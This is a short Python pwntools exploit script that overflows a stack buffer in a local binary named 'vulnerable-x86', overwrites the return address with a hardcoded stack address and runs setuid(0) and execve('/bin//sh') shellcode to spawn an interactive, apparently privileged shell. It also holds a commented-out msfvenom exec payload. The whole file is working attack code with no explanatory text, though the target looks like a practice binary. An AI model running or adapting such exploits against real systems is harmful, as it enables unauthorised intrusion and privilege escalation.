#!/usr/bin/env python3

from pwn import *

offset=112
p = process('./vulnerable-x86')

# msfvenom  -p linux/x86/exec -b "\x00\x0d\x0a" -f python -v shellcode
shellcode =  b""
shellcode += b"\xba\x19\x13\x3c\x51\xdb\xcb\xd9\x74\x24\xf4"
shellcode += b"\x5f\x2b\xc9\xb1\x06\x31\x57\x12\x83\xc7\x04"
shellcode += b"\x03\x4e\x1d\xde\xa4\x41\xe8\xe9\xa6\x11\xe1"
shellcode += b"\x7d\x06\x22\x9e\x7d\x30\xeb\x3c\x17\xae\x7a"
shellcode += b"\x23\x2a\xae"


setuid=b"\x6a\x17\x58\x31\xdb\xcd\x80"

execve=b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"



stack = p32(0xffffcf1c)  # Unfortunately there is no "jmp esp" available

payload = b'A' * offset
payload += stack
payload += b'\x90'*12
#payload += shellcode
payload += setuid
payload += execve

p.clean()
p.sendline(payload)
p.interactive()

